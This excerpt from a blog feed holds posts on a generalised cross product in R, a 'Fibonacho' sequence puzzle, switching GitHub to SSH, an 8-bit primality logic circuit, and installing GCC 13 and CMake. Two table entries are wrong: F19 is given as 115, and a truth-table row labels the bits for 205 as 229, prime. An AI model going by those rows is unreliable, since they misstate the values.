  </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nf">all</span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">len</span><span class="p">[</span><span class="m">1</span><span class="p">]))</span><span class="w"> </span><span class="n">stop</span><span class="p">(</span><span class="s2">"All vectors must be of same length!"</span><span class="p">)</span><span class="w">
  </span><span class="n">len</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">len</span><span class="p">[</span><span class="m">1</span><span class="p">]</span><span class="w">
  </span><span class="c1">#</span><span class="w">
  </span><span class="c1"># Check, if correct number of vectors is provided</span><span class="w">
  </span><span class="c1">#</span><span class="w">
  </span><span class="k">if</span><span class="p">(</span><span class="nf">length</span><span class="p">(</span><span class="n">u</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="n">len</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m">1</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="n">stop</span><span class="p">(</span><span class="s2">"For vector length "</span><span class="p">,</span><span class="n">len</span><span class="p">,</span><span class="s2">" you have to provide "</span><span class="p">,</span><span class="n">len</span><span class="m">-1</span><span class="p">,</span><span class="w"> </span><span class="s2">" vectors!"</span><span class="p">)</span><span class="w">
  </span><span class="n">U</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="n">do.call</span><span class="p">(</span><span class="n">cbind</span><span class="p">,</span><span class="w"> </span><span class="n">u</span><span class="p">)</span><span class="w">

  </span><span class="c1">#</span><span class="w">
  </span><span class="c1"># Compute the determinants based on the minors of U and Laplace's formula</span><span class="w">
  </span><span class="c1"># The determinants form the new vector which is the result of the cross-product</span><span class="w">
  </span><span class="c1">#</span><span class="w">
  </span><span class="n">sapply</span><span class="p">(</span><span class="m">1</span><span class="o">:</span><span class="n">len</span><span class="p">,</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="m">-1</span><span class="p">)</span><span class="o">^</span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="m">1</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">det</span><span class="p">(</span><span class="n">as.matrix</span><span class="p">(</span><span class="n">U</span><span class="p">[</span><span class="o">-</span><span class="n">i</span><span class="p">,])))</span><span class="w">
</span><span class="p">}</span><span class="w">

</span><span class="c1">#</span><span class="w">
</span><span class="c1"># Run an example</span><span class="w">
</span><span class="c1">#</span><span class="w">
</span><span class="n">a</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="m">1</span><span class="p">,</span><span class="m">2</span><span class="p">,</span><span class="m">3</span><span class="p">,</span><span class="m">4</span><span class="p">)</span><span class="w">
</span><span class="n">b</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="m">5</span><span class="p">,</span><span class="m">6</span><span class="p">,</span><span class="m">7</span><span class="p">,</span><span class="m">8</span><span class="p">)</span><span class="w">
</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;-</span><span class="w"> </span><span class="nf">c</span><span class="p">(</span><span class="m">9</span><span class="p">,</span><span class="m">10</span><span class="p">,</span><span class="m">-11</span><span class="p">,</span><span class="m">12</span><span class="p">)</span><span class="w">

</span><span class="n">print</span><span class="p">(</span><span class="n">opX</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">))</span><span class="w">

</span><span class="c1">#</span><span class="w">
</span><span class="c1"># Check the orthogonality property</span><span class="w">
</span><span class="c1">#</span><span class="w">
</span><span class="n">print</span><span class="p">(</span><span class="n">t</span><span class="p">(</span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="o">%*%</span><span class="w"> </span><span class="n">opX</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">))</span><span class="w">
</span><span class="n">print</span><span class="p">(</span><span class="n">t</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="o">%*%</span><span class="w"> </span><span class="n">opX</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">))</span><span class="w">
</span><span class="n">print</span><span class="p">(</span><span class="n">t</span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="o">%*%</span><span class="w"> </span><span class="n">opX</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">c</span><span class="p">))</span></code></pre></figure> ]]></content><author><name></name></author><category term="vectors"/><category term="cross product"/><category term="high dimensions"/><category term="generalization"/><category term="multi dimensionality"/><summary type="html"><![CDATA[Imagine you are working in three-dimensional space and have two directions. You want to find a third direction that is perpendicular to both of them. In this setting, there's a well-known solution: the cross product. When applied to the two original directions, it produces a new one that is exactly orthogonal to both.]]></summary></entry><entry><title type="html">Math Challenge: The Sequence of Fibonacho</title><link href="https://markusthill.github.io/blog/2025/the-fibonacho-sequence/" rel="alternate" type="text/html" title="Math Challenge: The Sequence of Fibonacho"/><published>2025-01-05T12:16:00+00:00</published><updated>2025-01-05T12:16:00+00:00</updated><id>https://markusthill.github.io/blog/2025/the-fibonacho-sequence</id><content type="html" xml:base="https://markusthill.github.io/blog/2025/the-fibonacho-sequence/"><![CDATA[<figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/fibonacho-16-9.webp" sizes="95vw"/> <img src="/assets/img/fibonacho-16-9.webp" class="img-fluid rounded z-depth-1 imgcenter" width="90%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 1:</b> How OpenAI‚Äôs OpenAI‚Äôs DALL¬∑E model imagines the Fibonacho Sequence. </figcaption> </figure> <p>The Fibonacho Sequence is a intriguing twist on the classical Fibonacci numbers. Unlike its better-known cousin, the Fibonacho Sequence does not follow the same simple recurrence relation. Instead, it introduces a slightly different structure, making it an entertaining little puzzle for math enthusiasts and programmers alike.</p> <p>In this challenge, you will explore the sequence‚Äôs definition, uncover its recurrence relation, and tackle a series of progressively more complex questions. Starting with small values and scaling up to massive indices, the goal is to unlock the underlying properties of this unique sequence, culminating in the analysis of numbers with hundreds of digits.</p> <p>Are you ready to dive into the challenge and see how far your skills can take you? Let‚Äôs get started!</p> <h2 id="sequence-definition-and-initial-values">Sequence Definition and Initial Values</h2> <p>The Fibonacho Sequence starts with a few predefined values and grows according to a hidden pattern. Unlike the Fibonacci sequence, which has a simple and elegant formula, the Fibonacho Sequence is less straightforward. Below is a table of the first few elements, \(F_n\) , of the <strong>Fibonacho Sequence</strong>:</p> <table> <thead> <tr> <th>n</th> <th>0</th> <th>1</th> <th>2</th> <th>3</th> <th>4</th> <th>5</th> <th>6</th> <th>7</th> <th>8</th> <th>9</th> <th>10</th> <th>11</th> <th>12</th> <th>13</th> <th>14</th> <th>15</th> <th>16</th> <th>17</th> <th>18</th> <th>19</th> <th>20</th> </tr> </thead> <tbody> <tr> <td>F<sub>n</sub></td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>1</td> <td>1</td> <td>2</td> <td>4</td> <td>6</td> <td>9</td> <td>15</td> <td>25</td> <td>40</td> <td>64</td> <td>104</td> <td>169</td> <td>273</td> <td>441</td> <td>714</td> <td>115</td> <td>1870</td> </tr> </tbody> </table> <p></p> <p>Furthermore, you are given \(F_{100} = 97905340104793732225\). Notice how the sequence grows, but not in the same way as the Fibonacci numbers.</p> <h2 id="part-1-understanding-the-problem--deriving-the-recurrence-relation">Part 1: Understanding the Problem &amp; Deriving the Recurrence Relation</h2> <p>The challenge begins with uncovering the recurrence relation that governs the Fibonacho Sequence. A recurrence relation is a formula that expresses each term of a sequence as a function of its preceding terms. However, unlike the Fibonacci sequence‚Äôs simple \(F_n = F_{n-1} + F_{n-2}\), the Fibonacho Sequence defies such simplicity. Your task is to deduce the recurrence relation by analyzing the given terms.</p> <p>Which general recurrence relation describes the sequence above?</p> <p><strong>Note again:</strong> It is <em>NOT</em> the recurrence relation for the <em>Fibonacci numbers</em>, since, for example, \(F_{17} \ne F_{15} + F_{16}\).</p> <h2 id="part-2-predicting-digits-at-larger-indices">Part 2: Predicting Digits at Larger Indices</h2> <p>Now that you‚Äôve explored the recurrence relation, it‚Äôs time to tackle larger terms in the sequence. You are given that:</p> <ul> <li>The <strong>first 10 digits</strong> of \(F_{1000}\) are \(1201386106\)</li> <li>The <strong>last 10 digits</strong> of \(F_{1000}\) are \(1044856625\)</li> </ul> <p>What are the <strong>first</strong> and <strong>last</strong> \(10\) digits of \(F_{10000}\)?</p> <h2 id="part-3-scaling-up">Part 3: Scaling Up!</h2> <p>In this part, the challenge becomes even more daunting. You are now tasked with examining the <strong>first</strong> and <strong>last</strong> \(\mathbf{100}\) digits of massive terms like \(F_{7^7} = F_{823543}\).</p> <p>For reference, you are given the first and last digits of \(F_{7^{7}} = F_{823543}\):</p> <table> <thead> <tr> <th>\(F_{7^{7}}\)</th> <th>digits</th> </tr> </thead> <tbody> <tr> <td>first 100</td> <td>2513371832737186384322330481943752132726740483311444508185490845781280728438771549838156508593799526</td> </tr> <tr> <td>last 100</td> <td>739646476432651186655886864569054345315965466581269946302070897583058681065487248400966951495110916</td> </tr> </tbody> </table> <p></p> <p>What are the <strong>first</strong> and <strong>last</strong> \(100\) digits of \(F_{4^{4^4}}\), \(F_{5^{5^5}}\), and \(F_{6^{6^6}}\) ?</p> <hr/> <p>Stay tuned, as I will reveal the solution and dive deeper into a few properties of the Fibonacho Sequence in a future blog post!</p>]]></content><author><name></name></author><category term="fibonacci"/><category term="number theory"/><category term="math"/><category term="python"/><category term="programming"/><summary type="html"><![CDATA[The Fibonacho Sequence is a playful and intriguing twist on the classical Fibonacci numbers. Unlike its better-known cousin, the Fibonacho Sequence does not follow the same simple recurrence relation. Instead, it introduces a slightly different structure, making it a entertaining puzzle for math enthusiasts and programmers alike. Are you ready to dive into the challenge?]]></summary></entry><entry><title type="html">Short Notes: Upgrade Your GitHub Workflow - Migrate from HTTPS to SSH</title><link href="https://markusthill.github.io/blog/2024/migrating-git-from-https-to-ssh/" rel="alternate" type="text/html" title="Short Notes: Upgrade Your GitHub Workflow - Migrate from HTTPS to SSH"/><published>2024-12-21T12:16:00+00:00</published><updated>2024-12-21T12:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/migrating-git-from-https-to-ssh</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/migrating-git-from-https-to-ssh/"><![CDATA[<p>If you‚Äôre currently using HTTPS to interact with your GitHub repositories and want to switch to SSH for better security and convenience, this guide walks you through the migration process step-by-step.</p> <hr/> <h2 id="why-switch-to-ssh">Why Switch to SSH?</h2> <p>SSH allows secure, password-less authentication using a key pair. Unlike HTTPS, you won‚Äôt need to repeatedly enter your GitHub credentials, making your workflow faster and more secure.</p> <hr/> <h2 id="steps-to-migrate-from-https-to-ssh">Steps to Migrate from HTTPS to SSH</h2> <h3 id="1-generate-a-new-ssh-key">1. Generate a New SSH Key</h3> <p>First, create a new SSH key if you don‚Äôt already have one: <code class="language-plaintext highlighter-rouge">ssh-keygen -t rsa -b 4096 -C "your_email@example.com"</code></p> <ul> <li>Replace <code class="language-plaintext highlighter-rouge">"your_email@example.com"</code> with your GitHub email.</li> <li>Follow the prompts to save the key to the default location and set a passcode (optional but recommended).</li> </ul> <h3 id="2-add-your-ssh-key-to-github">2. Add Your SSH Key to GitHub</h3> <p>Copy the public key to your clipboard:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pbcopy &lt; ~/.ssh/id_rsa.pub
</code></pre></div></div> <p>If <code class="language-plaintext highlighter-rouge">pbcopy</code> is unavailable, use:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat ~/.ssh/id_rsa.pub
</code></pre></div></div> <p>Then, add the key to your GitHub account:</p> <ul> <li>Go to <strong>Settings</strong> &gt; <strong>SSH and GPG Keys</strong> on GitHub.</li> <li>Click <strong>New SSH Key</strong>, paste the key, and save.</li> </ul> <h3 id="3-remove-stored-github-credentials-optional">3. Remove Stored GitHub Credentials (Optional)</h3> <p>If you‚Äôve used HTTPS before, your system might have cached your GitHub credentials. To avoid conflicts:</p> <ul> <li>On macOS or Linux: Look for credentials in your credential manager or <code class="language-plaintext highlighter-rouge">~/.git-credentials</code> and remove them.</li> <li>On Windows: Clear stored credentials via the Credential Manager.</li> </ul> <p>This step is optional but helps ensure a clean transition to SSH.</p> <h3 id="4-update-the-remote-url">4. Update the Remote URL</h3> <p>Convert your Git repository‚Äôs remote URL from HTTPS to SSH:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git remote set-url origin &lt;SSH url&gt;
</code></pre></div></div> <p>For example, if your HTTPS URL is: <code class="language-plaintext highlighter-rouge">https://github.com/username/repo_name.git</code></p> <p>Convert it to: <code class="language-plaintext highlighter-rouge">git@github.com:username/repo_name.git</code></p> <h3 id="5-verify-the-new-remote-url">5. Verify the New Remote URL</h3> <p>Ensure your repository is now configured to use SSH:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git remote -v
</code></pre></div></div> <p>The output should display the SSH URL.</p> <h3 id="6-test-your-ssh-connection">6. Test Your SSH Connection</h3> <p>Run the following command to test the SSH connection:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh -T git@github.com
</code></pre></div></div> <p>If everything is set up correctly, you‚Äôll see a message like: Hi username! You‚Äôve successfully authenticated, but GitHub does not provide shell access.</p> <h3 id="7-enter-your-ssh-key-passcode">7. Enter Your SSH Key Passcode</h3> <p>The first time you interact with GitHub via SSH, you‚Äôll be prompted for your key‚Äôs passcode if you set one.</p> <hr/> <p>Switching from HTTPS to SSH not only improves security but also streamlines your Git workflow by eliminating the need for repeated credential input. Follow these steps to make the transition smooth and hassle-free.</p> <p>Happy coding!</p>]]></content><author><name></name></author><category term="git"/><category term="ssh"/><category term="https"/><summary type="html"><![CDATA[A step-by-step guide to transitioning from HTTPS to SSH for secure and seamless GitHub repository management.]]></summary></entry><entry><title type="html">Designing an 8-Bit Integer Primality Test Using Logic Circuits</title><link href="https://markusthill.github.io/blog/2024/primality-test-logical-circuit/" rel="alternate" type="text/html" title="Designing an 8-Bit Integer Primality Test Using Logic Circuits"/><published>2024-12-20T01:16:00+00:00</published><updated>2024-12-20T01:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/primality-test-logical-circuit</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/primality-test-logical-circuit/"><![CDATA[<p>When working with digital circuits and number theory, I found that an interesting challenge is determining whether a given number is prime through purely combinational logic. Recently, I developed a circuit diagram for testing the primality of 8-bit integers using a Boolean function <code class="language-plaintext highlighter-rouge">f(a,b,c,d,e,f,g,h)</code>.</p> <h2 id="from-truth-table-to-near-minimal-form">From Truth Table to Near-Minimal Form</h2> <p>The process started with a comprehensive truth table that enumerated all possible 8-bit inputs (0 to 255) and flagged which of those are prime. This truth table served as the cornerstone of the design, capturing every input-to-output mapping.</p> <p>An excerpt of the table is listed below</p> <table> <thead> <tr> <th><code class="language-plaintext highlighter-rouge">a</code></th> <th><code class="language-plaintext highlighter-rouge">b</code></th> <th><code class="language-plaintext highlighter-rouge">c</code></th> <th><code class="language-plaintext highlighter-rouge">d</code></th> <th><code class="language-plaintext highlighter-rouge">e</code></th> <th><code class="language-plaintext highlighter-rouge">f</code></th> <th><code class="language-plaintext highlighter-rouge">g</code></th> <th><code class="language-plaintext highlighter-rouge">h</code></th> <th style="text-align: right"><code class="language-plaintext highlighter-rouge">Decimal</code></th> <th style="text-align: right"><code class="language-plaintext highlighter-rouge">Prime?</code></th> </tr> </thead> <tbody> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td style="text-align: right">0</td> <td style="text-align: right">0</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td style="text-align: right">1</td> <td style="text-align: right">0</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td style="text-align: right">2</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>1</td> <td style="text-align: right">3</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>0</td> <td style="text-align: right">4</td> <td style="text-align: right">0</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">5</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td>1</td> <td style="text-align: right">11</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">21</td> <td style="text-align: right">0</td> </tr> <tr> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">37</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>1</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td style="text-align: right">65</td> <td style="text-align: right">0</td> </tr> <tr> <td>0</td> <td>1</td> <td>0</td> <td>0</td> <td>1</td> <td>0</td> <td>0</td> <td>1</td> <td style="text-align: right">73</td> <td style="text-align: right">1</td> </tr> <tr> <td>0</td> <td>1</td> <td>1</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td style="text-align: right">97</td> <td style="text-align: right">1</td> </tr> <tr> <td>1</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td style="text-align: right">129</td> <td style="text-align: right">0</td> </tr> <tr> <td>1</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">141</td> <td style="text-align: right">0</td> </tr> <tr> <td>1</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td>0</td> <td>1</td> <td>1</td> <td style="text-align: right">171</td> <td style="text-align: right">0</td> </tr> <tr> <td>1</td> <td>1</td> <td>0</td> <td>0</td> <td>1</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">229</td> <td style="text-align: right">1</td> </tr> <tr> <td>1</td> <td>1</td> <td>1</td> <td>0</td> <td>0</td> <td>0</td> <td>1</td> <td>1</td> <td style="text-align: right">227</td> <td style="text-align: right">1</td> </tr> <tr> <td>1</td> <td>1</td> <td>1</td> <td>1</td> <td>1</td> <td>1</td> <td>0</td> <td>1</td> <td style="text-align: right">253</td> <td style="text-align: right">0</td> </tr> </tbody> </table> <p><br/></p> <p>With the initial definition in hand, I applied the <a href="https://en.wikipedia.org/wiki/Quine%E2%80%93McCluskey_algorithm">Quine-McCluskey (QMC) algorithm</a> ‚Äî a classic Boolean simplification method. This gave a minimal solution in terms of prime (not related to the primality test problem which we are solving here) implicants. However, the theoretically minimal form doesn‚Äôt always translate to the most practical implementation. To address this, I performed additional algebraic factorizations, aiming to balance minimality and practical constraints like the total number of gates and propagation delay. The final result is a near-minimal form that efficiently represents the primality function.</p> <h2 id="interactivity-and-exploration">Interactivity and Exploration</h2> <p>If you‚Äôre curious to see this in action, I‚Äôve provided an interactive environment where you can experiment with the inputs and observe the outputs directly. Feel free to play around and tweak bits‚Äîtry changing the inputs and see how the circuit responds. You can toggle one of the 8 bits at the top of the diagram to generate your own 8-bit integer.</p> <p><a href="https://circuitverse.org/users/283769/projects/prime_number_test"><strong>Try it out here!</strong></a>: <a href="https://circuitverse.org/users/283769/projects/prime_number_test">https://circuitverse.org/users/283769/projects/prime_number_test</a></p> <h2 id="logic-circuit-diagram">Logic Circuit Diagram</h2> <p>The project file can be downloaded from <a href="https://MarkusThill.github.io/assets/img/2024-12-18-primality-test-logical-circuit/prime_number_test_project.cv">here</a>.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-18-primality-test-logical-circuit/diagram_1-480.webp 480w,/assets/img/2024-12-18-primality-test-logical-circuit/diagram_1-800.webp 800w,/assets/img/2024-12-18-primality-test-logical-circuit/diagram_1-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-18-primality-test-logical-circuit/diagram_1.png" class="img-fluid rounded z-depth-1 imgcenter" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 1:</b> Logic Circuit Diagram for the 8-bit Integer Primality Test. In this example the input is set to 233. You can interact with the diagram <a href="https://circuitverse.org/users/283769/projects/prime_number_test">here</a> and run a simulation. </figcaption> </figure> <h2 id="final-thoughts">Final Thoughts</h2> <p>The techniques applied here ‚Äî truth table construction, Quine-McCluskey minimization, and further algebraic optimization ‚Äî are not limited to primality tests. They are part of the essential toolbox for digital logic design. By working through such an example, you‚Äôll gain a deeper understanding of the trade-offs between perfect minimization and practical considerations like flexibility and ease of modification.</p> <p>Note that while this approach effectively demonstrates the concept for 8-bit integers, it becomes increasingly impractical to scale for larger bit-widths (e.g., 16-bit or higher) due to the exponential growth in the truth table size and the corresponding complexity of the Boolean function. This limitation lies in the nature of prime numbers themselves, as they lack a simple, deterministic function to identify them, requiring inherently complex and resource-intensive algorithms or representations.</p>]]></content><author><name></name></author><category term="electronics"/><category term="boolean algebra"/><category term="prime numbers"/><summary type="html"><![CDATA[When working with digital circuits and number theory, I found that an interesting challenge is determining whether a given number is prime through purely combinational logic. Recently, I developed a circuit diagram for testing the primality of 8-bit integers using a Boolean function `f(a,b,c,d,e,f,g,h)`.]]></summary></entry><entry><title type="html">Short Notes: Installing GCC 13 on Debian and Ubuntu</title><link href="https://markusthill.github.io/blog/2024/installing-gcc/" rel="alternate" type="text/html" title="Short Notes: Installing GCC 13 on Debian and Ubuntu"/><published>2024-12-19T12:16:00+00:00</published><updated>2024-12-19T12:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/installing-gcc</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/installing-gcc/"><![CDATA[<h1 id="installing-gcc-1330-on-ubuntu">Installing GCC 13.3.0 on Ubuntu</h1> <p>To install GCC 13.3.0 on your Ubuntu system, you can use the <code class="language-plaintext highlighter-rouge">ubuntu-toolchain-r/test</code> PPA, which provides newer versions of GCC.</p> <h2 id="steps-to-install-gcc-13">Steps to Install GCC 13</h2> <h3 id="1-update-your-package-list-and-install-prerequisites">1. Update Your Package List and Install Prerequisites</h3> <p>Run the following commands:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt update
sudo apt install -y software-properties-common
</code></pre></div></div> <h3 id="2-add-the-toolchain-test-ppa">2. Add the Toolchain Test PPA</h3> <p>Use the following commands to add the PPA:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo add-apt-repository ppa:ubuntu-toolchain-r/test
sudo apt update
</code></pre></div></div> <h3 id="3-install-gcc-13">3. Install GCC 13</h3> <p>Run the command:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install -y gcc-13 g++-13
</code></pre></div></div> <h3 id="4-verify-the-installation">4. Verify the Installation</h3> <p>Check the installed GCC version:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc-13 --version
</code></pre></div></div> <p>This should display the installed version of GCC 13.</p> <h3 id="5-set-gcc-13-as-the-default-compiler-optional">5. Set GCC 13 as the Default Compiler (Optional)</h3> <p>If you have multiple versions of GCC installed and want to set GCC 13 as the default, use the <code class="language-plaintext highlighter-rouge">update-alternatives</code> tool:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-11 11
sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-11 11
sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-13 13
sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-13 13
</code></pre></div></div> <p>Follow the on-screen instructions to select GCC 13 as the default compiler:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo update-alternatives --config gcc
sudo update-alternatives --config g++
</code></pre></div></div> <p>Check the currently configured version, for example, with:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc --version
cc --version
g++ --version
c++ --version
</code></pre></div></div> <hr/> <h2 id="notes">Notes</h2> <ol> <li>The <code class="language-plaintext highlighter-rouge">ubuntu-toolchain-r/test</code> PPA provides the latest GCC versions, but the exact subversion (e.g., 13.3.0) may vary.</li> <li>As of now (Dec 2024), GCC 13.3.0 is not available in the PPA; the latest version provided is GCC 13.2.0.</li> <li>If you specifically require GCC 13.3.0, you may need to build it from source. For most purposes, the version available in the PPA should suffice.</li> </ol> <hr/> <h2 id="additional-resources">Additional Resources</h2> <p>For more detailed instructions and additional methods to install GCC on Ubuntu, refer to the following resources:</p> <ul> <li>Install GCC 13 on Ubuntu 22.04 - Lindevs: https://lindevs.com/install-gcc-on-ubuntu/</li> <li> <table> <tbody> <tr> <td>Installing GCC13 on Ubuntu 22.04</td> <td>DeveloperNote.com: https://developernote.com/2023/08/installing-gcc13-on-ubuntu-22-04/</td> </tr> </tbody> </table> </li> <li> <table> <tbody> <tr> <td>How to Install the Latest Version of GCC on Ubuntu</td> <td>Baeldung on Linux: https://www.baeldung.com/linux/gnu-compiler-collection-ubuntu-installation</td> </tr> </tbody> </table> </li> </ul> <p>These guides provide comprehensive steps and additional context for installing GCC on Ubuntu systems.</p>]]></content><author><name></name></author><category term="c++"/><category term="c"/><category term="debian"/><category term="ubuntu"/><summary type="html"><![CDATA[Learn how to install and configure the latest GNU GCC/G++ compiler on Debian and Ubuntu systems. This step-by-step guide covers updating packages, adding the Toolchain Test PPA, installing GCC 13, verifying the installation, and setting it as the default compiler.]]></summary></entry><entry><title type="html">Short Notes: Installing the Latest CMake on Debian and Ubuntu</title><link href="https://markusthill.github.io/blog/2024/installing-cmake/" rel="alternate" type="text/html" title="Short Notes: Installing the Latest CMake on Debian and Ubuntu"/><published>2024-12-18T12:16:00+00:00</published><updated>2024-12-18T12:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/installing-cmake</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/installing-cmake/"><![CDATA[<p>This guide provides step-by-step instructions for installing the latest version of CMake on Debian-based systems, including Debian and Ubuntu. You‚Äôll learn how to remove an existing version, meet prerequisites, compile from source, and verify the installation.</p> <hr/> <h2 id="step-1-remove-old-versions-of-cmake">Step 1: Remove Old Versions of CMake</h2> <p>If you already have an older version of CMake installed, it‚Äôs a good idea to remove it to avoid conflicts. Run the following command:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt remove <span class="nt">--purge</span> <span class="nt">--auto-remove</span> cmake
</code></pre></div></div> <hr/> <h2 id="step-2-install-required-dependencies">Step 2: Install Required Dependencies</h2> <p>Before compiling CMake from source, ensure you have the necessary libraries installed. The <code class="language-plaintext highlighter-rouge">libssl-dev</code> package is particularly important to avoid compilation errors:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>libssl-dev
</code></pre></div></div> <hr/> <h2 id="step-3-download-and-compile-the-latest-cmake-version">Step 3: Download and Compile the Latest CMake Version</h2> <p>Now, download and compile the latest version of CMake. Replace the <code class="language-plaintext highlighter-rouge">version</code> and <code class="language-plaintext highlighter-rouge">build</code> variables with the desired CMake version numbers. Check <a href="https://cmake.org/files/">https://cmake.org/files/</a>, for the latest versions.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Adjust the version and build as needed</span>
<span class="nv">version</span><span class="o">=</span>3.29
<span class="nv">build</span><span class="o">=</span>9

<span class="c"># Create a temporary directory for the build process</span>
<span class="nb">mkdir</span> ~/temp
<span class="nb">cd</span> ~/temp

<span class="c"># Download the source tarball</span>
wget https://cmake.org/files/v<span class="nv">$version</span>/cmake-<span class="nv">$version</span>.<span class="nv">$build</span>.tar.gz

<span class="c"># Extract the tarball</span>
<span class="nb">tar</span> <span class="nt">-xzvf</span> cmake-<span class="nv">$version</span>.<span class="nv">$build</span>.tar.gz
<span class="nb">cd </span>cmake-<span class="nv">$version</span>.<span class="nv">$build</span>/

<span class="c"># Configure and build CMake</span>
./bootstrap
make <span class="nt">-j</span><span class="si">$(</span><span class="nb">nproc</span><span class="si">)</span>  <span class="c"># Utilize all available CPU cores for faster compilation</span>
<span class="nb">sudo </span>make <span class="nb">install</span>
</code></pre></div></div> <p>This process might take some time depending on your system‚Äôs resources.</p> <hr/> <h2 id="step-4-verify-the-installation">Step 4: Verify the Installation</h2> <p>After the installation is complete, verify that CMake is correctly installed:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cmake <span class="nt">--version</span>
